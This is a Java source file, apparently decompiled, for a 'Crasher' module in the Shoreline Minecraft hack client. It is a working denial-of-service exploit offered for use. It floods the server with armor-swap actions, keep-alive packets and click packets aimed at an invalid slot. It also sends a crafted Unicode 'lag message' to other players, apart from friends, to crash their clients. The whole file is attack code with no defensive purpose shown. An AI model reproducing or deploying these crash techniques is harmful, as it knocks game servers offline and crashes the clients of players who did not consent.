package net.shoreline.client.impl.module.exploit;

import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.class_1268;
import net.minecraft.class_1297;
import net.minecraft.class_1657;
import net.minecraft.class_1713;
import net.minecraft.class_1738;
import net.minecraft.class_1799;
import net.minecraft.class_1802;
import net.minecraft.class_2596;
import net.minecraft.class_2663;
import net.minecraft.class_2670;
import net.minecraft.class_2813;
import net.minecraft.class_2827;
import net.shoreline.client.api.config.Config;
import net.shoreline.client.api.config.setting.EnumConfig;
import net.shoreline.client.api.event.EventStage;
import net.shoreline.client.api.event.listener.EventListener;
import net.shoreline.client.api.module.ModuleCategory;
import net.shoreline.client.api.module.ToggleModule;
import net.shoreline.client.impl.event.TickEvent;
import net.shoreline.client.impl.event.network.PacketEvent;
import net.shoreline.client.init.Managers;
import net.shoreline.client.util.chat.ChatUtil;

public class CrasherModule extends ToggleModule {
   Config<CrasherModule.CrasherMode> modeConfig;
   private long keepAliveId;
   private static final String LAG_MESSAGE = "āȁ́Ё\u0601܁ࠁँਁଁก༁ခᄁሁጁᐁᔁᘁᜁ᠁ᤁᨁᬁᰁᴁḁἁ℁∁⌁␁━✁⠁⤁⨁⬁Ⰱⴁ⸁⼁、\u3101㈁㌁㐁㔁㘁㜁㠁㤁㨁㬁㰁㴁㸁㼁䀁䄁䈁䌁䐁䔁䘁䜁䠁䤁䨁䬁䰁䴁丁企倁儁刁匁吁唁嘁圁堁夁威嬁封崁币弁态愁戁持搁攁昁朁栁椁樁欁氁洁渁漁瀁焁爁猁琁甁瘁省码礁稁笁簁紁縁缁老脁舁茁萁蔁蘁蜁蠁褁訁謁谁贁踁輁送鄁鈁錁鐁锁阁霁頁餁騁鬁鰁鴁鸁鼁ꀁꄁꈁꌁꐁꔁꘁ꜁ꠁ꤁ꨁꬁ각괁긁꼁뀁넁눁댁됁딁똁뜁렁뤁먁묁밁봁";

   public CrasherModule() {
      super("Crasher", "Attempts to crash poorly configured clients/servers", ModuleCategory.EXPLOITS);
      this.modeConfig = new EnumConfig("Mode", "The exploit mode to use when crashing", CrasherModule.CrasherMode.ARMOR, CrasherModule.CrasherMode.values());
   }

   @EventListener
   public void onTick(TickEvent event) {
      if (event.getStage() == EventStage.PRE) {
         int i;
         switch((CrasherModule.CrasherMode)this.modeConfig.getValue()) {
         case ARMOR:
            for(i = 0; i < 300; ++i) {
               if (mc.field_1724.method_31548().method_5438(38).method_7909() != class_1802.field_8162) {
                  mc.field_1761.method_2906(mc.field_1724.field_7512.field_7763, 6, 0, class_1713.field_7791, mc.field_1724);
               }

               if (mc.field_1724.method_6047().method_7909() instanceof class_1738) {
                  mc.field_1761.method_2919(mc.field_1724, class_1268.field_5808);
               }
            }

            return;
         case CONSOLE:
            for(i = 0; i < 5; ++i) {
               class_2827 packet = new class_2827((long)(this.keepAliveId++));

               try {
                  Managers.NETWORK.sendPacket(packet);
               } catch (Exception var7) {
                  var7.printStackTrace();
               }
            }

            return;
         case OUT_OF_BOUNDS:
            for(i = 0; i < 100; ++i) {
               class_1799 stack = new class_1799(mc.field_1724.method_6047().method_7909());
               class_2813 packet = new class_2813(0, 69, mc.field_1724.field_7512.method_37421(), 1, class_1713.field_7794, stack, new Int2ObjectOpenHashMap());

               try {
                  Managers.NETWORK.sendPacket(packet);
               } catch (Exception var6) {
                  var6.printStackTrace();
               }
            }
         }

      }
   }

   @EventListener
   public void onPacketInbound(PacketEvent.Inbound event) {
      if (mc.field_1724 != null && mc.field_1687 != null) {
         class_2596 var4 = event.getPacket();
         if (var4 instanceof class_2670) {
            class_2670 packet = (class_2670)var4;
            this.keepAliveId = packet.method_11517();
         } else {
            var4 = event.getPacket();
            if (var4 instanceof class_2663) {
               class_2663 packet = (class_2663)var4;
               if (packet.method_11470() == 35 && this.modeConfig.getValue() == CrasherModule.CrasherMode.UNICODE) {
                  class_1297 entity = packet.method_11469(mc.field_1687);
                  if (entity instanceof class_1657) {
                     class_1657 player = (class_1657)entity;
                     if (player != mc.field_1724 && !Managers.SOCIAL.isFriend(player.method_5477())) {
                        ChatUtil.serverSendMessage(player, "āȁ́Ё\u0601܁ࠁँਁଁก༁ခᄁሁጁᐁᔁᘁᜁ᠁ᤁᨁᬁᰁᴁḁἁ℁∁⌁␁━✁⠁⤁⨁⬁Ⰱⴁ⸁⼁、\u3101㈁㌁㐁㔁㘁㜁㠁㤁㨁㬁㰁㴁㸁㼁䀁䄁䈁䌁䐁䔁䘁䜁䠁䤁䨁䬁䰁䴁丁企倁儁刁匁吁唁嘁圁堁夁威嬁封崁币弁态愁戁持搁攁昁朁栁椁樁欁氁洁渁漁瀁焁爁猁琁甁瘁省码礁稁笁簁紁縁缁老脁舁茁萁蔁蘁蜁蠁褁訁謁谁贁踁輁送鄁鈁錁鐁锁阁霁頁餁騁鬁鰁鴁鸁鼁ꀁꄁꈁꌁꐁꔁꘁ꜁ꠁ꤁ꨁꬁ각괁긁꼁뀁넁눁댁됁딁똁뜁렁뤁먁묁밁봁");
                     }
                  }
               }
            }
         }

      }
   }

   public static enum CrasherMode {
      ARMOR,
      CONSOLE,
      OUT_OF_BOUNDS,
      UNICODE;

      // $FF: synthetic method
      private static CrasherModule.CrasherMode[] $values() {
         return new CrasherModule.CrasherMode[]{ARMOR, CONSOLE, OUT_OF_BOUNDS, UNICODE};
      }
   }
}
